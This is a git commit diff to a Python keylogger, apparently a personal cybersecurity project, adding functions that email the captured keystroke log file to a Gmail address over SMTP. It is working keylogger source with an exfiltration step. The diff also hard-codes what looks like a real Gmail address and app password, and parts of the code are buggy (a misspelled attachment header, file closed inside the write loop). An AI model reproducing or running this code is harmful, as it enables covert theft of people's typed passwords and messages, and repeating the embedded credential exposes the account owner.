e25cdc1893f3e5250f2894e92a6c3a9009303d11
ThArInDu0621 <lakmal8442tharindu@gmail.com>
2025-04-26 14:12:56 +0530

    add email functions

--- project/keylogger.py
+++ project/keylogger.py
@@ -2,7 +2,52 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+from_addr = "tharilaki82@gmail.com"
+toaddress = "tharilaki82@gmail.com"
+password = "wstqisdjuuvmgphe"
+body = "hiiiii"
+keys_information = "key_log.txt"
+path = "E:\\Cyber security projects\\Keylogger\\keylogger\\project"
+extend = "\\"
+
 keys = []
+
+def send_email(filename, attachment, toaddress):
+
+    msg = MIMEMultipart()
+
+    msg['From'] = from_addr
+    msg['To'] = toaddress
+    msg['Subject'] = "Log file"
+
+    body = "This is the body"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octed-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Desposion', "attachment; filename %s" %filename)
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.starttls()
+    s.login(from_addr, password)
+    text = msg.as_string()
+    s.sendmail(from_addr, toaddress, text)
+    s.quit()
+
+send_email(keys_information, path + extend + keys_information, toaddress)
+
 def press(key):
     global keys
     keys.append(key)
@@ -12,14 +57,18 @@ def release(key):
     pass
 
 def write_file(keys):
-    with open("key_log.txt", "a") as f:
+    with open(path + extend + keys_information, "a") as f:
         for key in keys:
+            k = str(key).replace("'", "")
             if key == Key.space:
                 f.write('\n')
+                f.close()
             elif hasattr(key, 'char'):
                 f.write(key.char)
-            else:
-                f.write(str(key))
+                f.close()
+
 
 with Listener(on_press=press, on_release=release) as listener:
     listener.join()
+
+
